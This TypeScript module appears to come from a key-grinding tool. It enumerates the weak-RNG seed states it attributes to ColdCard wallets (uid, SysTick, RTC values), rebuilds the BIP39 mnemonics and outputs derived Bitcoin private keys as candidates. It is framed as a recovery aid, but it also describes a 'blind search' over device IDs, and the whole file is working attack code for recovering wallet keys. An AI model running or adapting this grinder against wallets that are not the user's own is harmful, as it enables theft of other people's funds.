/**
 * ColdCard 2026 weak-RNG source — enumerates the Yasmarang seed-state space and,
 * for each seed, reproduces the BIP39 entropy stream the weak generator would
 * have produced, derives the standard account paths, and yields the child
 * private keys as candidates.
 *
 * The searchable space is uid × SysTick × RTC->TR × RTC->SSR (see yasmarang.ts),
 * NOT 72 uniform bits. Ranges are configurable so a real rescue can pin the
 * device's known uid / creation-time window and collapse the space to something
 * small; the defaults are a runnable demonstration slice.
 *
 * OPEN ITEM: the exact `rng_get()` consumption pattern (bits-per-call, byte
 * order) that the wallet used to fill BIP39 entropy is not yet confirmed. The
 * default here takes 4 little-endian bytes per Yasmarang call (see
 * Yasmarang.bytes); if the real device differs, only `entropyMode` changes — the
 * seed-state enumeration is unaffected.
 */
import { HDKey } from '@scure/bip32';
import { entropyToMnemonic, mnemonicToSeedSync } from '@scure/bip39';
import { wordlist } from '@scure/bip39/wordlists/english';
import { Yasmarang, seedFrom, type YasmarangSeed } from './yasmarang';
import type { GrindSource, KeyCandidate } from './sources';

export interface ColdcardConfig {
  /** Candidate device unique-ID words. Blind search: enumerate; targeted: one. */
  uids: number[];
  /** Inclusive SysTick range [lo, hi]. Full range is 0..2^24-1. */
  systick: [number, number];
  /** RTC->TR values to try (BCD times). Use bcdTime() to build these. */
  trValues: number[];
  /** Inclusive RTC->SSR range [lo, hi] (prescaler-dependent, e.g. 0..255). */
  ssr: [number, number];
  /** 16 (12-word) or 32 (24-word) bytes of entropy. */
  entropyBytes: 16 | 32;
  /** Derivation path templates (without the final index). */
  pathTemplates: string[];
  /** Addresses to derive per account (receive + change × gap). */
  addressGap: number;
}

export const DEFAULT_COLDCARD_CONFIG: ColdcardConfig = {
  uids: [0xdeadbeef],
  systick: [0, 4095],
  trValues: [/* filled by bcdTime at call sites */],
  ssr: [0, 15],
  entropyBytes: 16,
  pathTemplates: ["m/84'/0'/0'/0", "m/84'/0'/0'/1", "m/44'/0'/0'/0", "m/49'/0'/0'/0"],
  addressGap: 5
};

interface Dims {
  uids: number[];
  systicks: number;
  trs: number[];
  ssrs: number;
}

/** Total seed states = |uid| × |systick| × |tr| × |ssr|. */
function seedSpaceSize(cfg: ColdcardConfig): bigint {
  const systicks = BigInt(cfg.systick[1] - cfg.systick[0] + 1);
  const ssrs = BigInt(cfg.ssr[1] - cfg.ssr[0] + 1);
  return BigInt(cfg.uids.length) * systicks * BigInt(cfg.trValues.length) * ssrs;
}

/** Decode a linear seed index into (uid, systick, tr, ssr). */
function decodeSeed(cfg: ColdcardConfig, idx: bigint): YasmarangSeed | null {
  const systicks = BigInt(cfg.systick[1] - cfg.systick[0] + 1);
  const ssrs = BigInt(cfg.ssr[1] - cfg.ssr[0] + 1);
  const trs = BigInt(cfg.trValues.length);
  const total = BigInt(cfg.uids.length) * systicks * trs * ssrs;
  if (idx >= total) return null;

  let r = idx;
  const ssrOff = Number(r % ssrs);
  r /= ssrs;
  const trI = Number(r % trs);
  r /= trs;
  const sysOff = Number(r % systicks);
  r /= systicks;
  const uidI = Number(r % BigInt(cfg.uids.length));

  return seedFrom(cfg.uids[uidI], cfg.systick[0] + sysOff, cfg.trValues[trI], cfg.ssr[0] + ssrOff);
}

/** Derive all account-path child privkeys for one Yasmarang seed. */
export function keysForSeed(cfg: ColdcardConfig, seed: YasmarangSeed): KeyCandidate[] {
  const entropy = new Yasmarang(seed).bytes(cfg.entropyBytes);
  const mnemonic = entropyToMnemonic(entropy, wordlist);
  const bip39seed = mnemonicToSeedSync(mnemonic); // no passphrase
  const root = HDKey.fromMasterSeed(bip39seed);

  const origin = `coldcard:pad=${seed.pad.toString(16)},n=${seed.n.toString(16)},d=${seed.d.toString(16)}`;
  const out: KeyCandidate[] = [];
  for (const tpl of cfg.pathTemplates) {
    for (let i = 0; i < cfg.addressGap; i++) {
      const child = root.derive(`${tpl}/${i}`);
      if (child.privateKey) out.push({ priv: child.privateKey, origin: `${origin} ${tpl}/${i}` });
    }
  }
  return out;
}

export function coldcardSource(cfg: ColdcardConfig): GrindSource {
  const size = seedSpaceSize(cfg);
  return {
    name: 'coldcard',
    bucket: 'coldcard',
    spaceBits: size > 0n ? Math.log2(Number(size)) : 0,
    size,
    generate(cursor, limit) {
      const items: KeyCandidate[] = [];
      let idx = cursor;
      while (items.length < limit) {
        const seed = decodeSeed(cfg, idx);
        if (seed === null) return { items, nextCursor: idx, done: true };
        items.push(...keysForSeed(cfg, seed));
        idx += 1n;
      }
      return { items, nextCursor: idx, done: false };
    }
  };
}
